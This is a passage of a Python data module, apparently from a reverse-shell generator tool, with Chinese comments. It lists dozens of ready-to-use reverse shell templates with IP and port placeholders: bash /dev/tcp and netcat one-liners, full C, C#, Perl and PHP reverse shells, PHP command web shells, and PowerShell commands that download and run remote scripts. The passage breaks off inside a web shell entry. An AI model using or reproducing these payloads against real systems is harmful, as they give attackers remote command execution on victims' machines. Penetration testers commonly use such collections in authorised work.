"""反弹 Shell 命令数据 

包含 5 类 Payload 数据（反弹 Shell / 绑定 Shell / MSFVenom / HoaxShell / 汇编 Shellcode）
以及监听器命令、Shell 选项、特殊编码 Payload 等辅助数据。


"""

from typing import Dict, List, Tuple


# ============================================================================
# 命令类型枚举
# ============================================================================

class CommandType:
    ReverseShell = "ReverseShell"
    BindShell = "BindShell"
    MSFVenom = "MSFVenom"
    HoaxShell = "HoaxShell"
    Assembled = "Assembled"
    Proxy = "Proxy"
    Cleanup = "Cleanup"


# ============================================================================
# 辅助：为每条命令追加 commandType meta 标签
# ============================================================================

def _tag(command_type: str, entries: List[dict]) -> List[dict]:
    """为命令列表中的每条命令追加 commandType 标签"""
    for entry in entries:
        entry["meta"].append(command_type)
    return entries


# ============================================================================
# 反弹 Shell 命令 (42 条)
# ============================================================================

REVERSE_SHELL_COMMANDS = _tag(CommandType.ReverseShell, [
    {
        "name": "Bash -i",
        "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash 196 TCP",
        "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash 196 UDP",
        "command": "0<&196;exec 196<>/dev/udp/{ip}/{port}; {shell} <&196 >&196 2>&196",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash read line",
        "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash 5",
        "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash udp",
        "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc mkfifo",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc mknod",
        "command": "rm -f /tmp/p;mknod /tmp/p p && nc {ip} {port} 0< /tmp/p | {shell} 1> /tmp/p",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc -e",
        "command": "nc {ip} {port} -e {shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc.exe -e",
        "command": "nc.exe {ip} {port} -e {shell}",
        "meta": ["windows"]
    },
    {
        "name": "BusyBox nc -e",
        "command": "busybox nc {ip} {port} -e {shell}",
        "meta": ["linux"]
    },
    {
        "name": "nc -c",
        "command": "nc -c {shell} {ip} {port}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc|",
        "command": "{shell} | nc {ip} {port}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc|2",
        "command": "nc {ip} {port} | {shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "ncat -e",
        "command": "ncat {ip} {port} -e {shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "ncat.exe -e",
        "command": "ncat.exe {ip} {port} -e {shell}",
        "meta": ["windows"]
    },
    {
        "name": "ncat udp",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
        "meta": ["linux", "mac"]
    },
    {
        "name": "curl",
        "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
        "meta": ["linux", "mac"]
    },
    {
        "name": "rustcat",
        "command": "rcat connect -s {shell} {ip} {port}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "C",
        "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execvp(\"{shell}\", argv);\n\n    return 0;       \n}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "C Windows",
        "command": "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"{ip}\"; \r\nchar port[6] = \"{port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
        "meta": ["windows"]
    },
    {
        "name": "C# TCP Client",
        "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"{shell}\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
        "meta": ["linux", "windows"]
    },
    {
        "name": "C# Bash -i",
        "command": "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"{shell}\";\n\t  proc.StartInfo.Arguments = \"-c \\\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",
        "meta": ["linux", "windows"]
    },
    {
        "name": "Haskell #1",
        "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
        "meta": ["linux", "mac"]
    },
    {
        "name": "OpenSSL",
        "command": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Perl",
        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Perl no sh",
        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Perl PentestMonkey",
        "command": "#!/usr/bin/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = \"1.0\";\n\nmy $ip = '{ip}';\nmy $port = {port};\n\nmy $daemon = 1;\nmy $auth   = 0;\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\nmy $global_page = \"\";\nmy $fake_process_name = \"/usr/sbin/apache\";\n\n$0 = \"[httpd]\";\n\nif (defined($ENV{'REMOTE_ADDR'})) {\n\tcgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n\n\tif ($auth) {\n\t\tunless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n\t\t\tcgiprint(\"ERROR: Your client isn't authorised to view this page\");\n\t\t\tcgiexit();\n\t\t}\n\t}\n} elsif ($auth) {\n\tcgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n\tcgiexit(0);\n}\n\nif ($daemon) {\n\tmy $pid = fork();\n\tif ($pid) {\n\t\tcgiexit(0);\n\t}\n\n\tsetsid();\n\tchdir('/');\n\tumask(0);\n}\n\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n\tcgiprint(\"Sent reverse shell to $ip:$port\");\n\tcgiprintpage();\n} else {\n\tcgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n\tcgiexit();\n}\n\nopen(STDIN, \">&SOCK\");\nopen(STDOUT,\">&SOCK\");\nopen(STDERR,\">&SOCK\");\n$ENV{'HISTFILE'} = '/dev/null';\nsystem(\"w;uname -a;id;pwd\");\nexec({\"{shell}\"} ($fake_process_name, \"-i\"));\n\nsub cgiprint {\n\tmy $line = shift;\n\t$line .= \"<p>\\n\";\n\t$global_page .= $line;\n}\n\nsub cgiexit {\n\tcgiprintpage();\n\texit 0;\n}\n\nsub cgiprintpage {\n\tprint \"Content-Length: \" . length($global_page) . \"\\r\nConnection: close\\r\nContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP PentestMonkey",
        "command": "<?php\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),\n   1 => array(\"pipe\", \"w\"),\n   2 => array(\"pipe\", \"w\")\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP Ivan Sincek",
        "command": "<?php\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'),\n        1 => array('pipe', 'w'),\n        2 => array('pipe', 'w')\n    );\n    private $buffer  = 1024;\n    private $clen    = 0;\n    private $error   = false;\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) {\n            $this->os    = 'LINUX';\n            $this->shell = '{shell}';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0);\n        @umask(0);\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) {\n            $this->error = true;\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) {\n            $this->error = true;\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }\n            $this->dump($data);\n        }\n    }\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\n            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {\n                $this->clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this->dump($data);\n        }\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false);\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false);\n                    }\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n\t\t\t\t\t\t$status = proc_get_status($process);\n                        if (feof($socket)) {\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break;\n                        }\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]),\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }\n                            } else if ($this->os === 'WINDOWS') {\n                                if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }\n                            }\n                        }\n                    } while (!$this->error);\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                fclose($socket);\n            }\n        }\n    }\n}\necho '<pre>';\n$sh = new Shell('{ip}', {port});\n$sh->run();\nunset($sh);\necho '</pre>';\n?>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP cmd",
        "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP cmd 2",
        "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP cmd small",
        "command": "<?=`$_GET[0]`?>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP exec",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP shell_exec",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP system",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP passthru",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP `",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP popen",
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP proc_open",
        "command": "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"{shell}\",[$s,$s,$s],$p);'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "Windows ConPty",
        "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #1",
        "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #2",
        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #3",
        "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #4 (TLS)",
        "command": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #5 (powercat)",
        "command": "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {ip} -p {port} -e cmd",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #3 (Base64)",
        "command": "__POWERSHELL_BASE64_3__",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #5 (stderr support) (Base64)",
        "command": "__POWERSHELL_BASE64_5__",
        "meta": ["windows"]
    },
    {
        "name": "P0wny Shell (Webshell)",
        "command": "<?php\n\n$SHELL_CONFIG = array(\n    'username' => 'p0wny',\n    'hostname' => 'shell',\n);\n\nfunction expandPath($path) {\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\n        exec(\"echo $match[1]\", $stdout);\n        return $stdout[0] . $match[2];\n    }\n    return $path;\n}\n\nfunction allFunctionExist($list = array()) {\n    foreach ($list as $entry) {\n        if (!function_exists($entry)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nfunction executeCommand($cmd) {\n    $output = '';\n    if (function_exists('exec')) {\n        exec($cmd, $output);\n        $output = implode(\"\\n\", $output);\n    } else if (function_exists('shell_exec')) {\n        $output = shell_exec($cmd);\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        system($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        passthru($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\n        $handle = popen($cmd, 'r');\n        while (!feof($handle)) {\n            $output .= fread($handle, 4096);\n        }\n        pclose($handle);\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\n        $output = stream_get_contents($pipes[1]);\n        proc_close($handle);\n    }\n    return $output;\n}\n\nfunction isRunningWindows() {\n    return stripos(PHP_OS, \"WIN\") === 0;\n}\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = \"\";\n\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\n        chdir(expandPath(\"~\"));\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir(expandPath($match[1]));\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        $stdout = executeCommand($cmd);\n    }\n\n    return array(\n        \"stdout\" 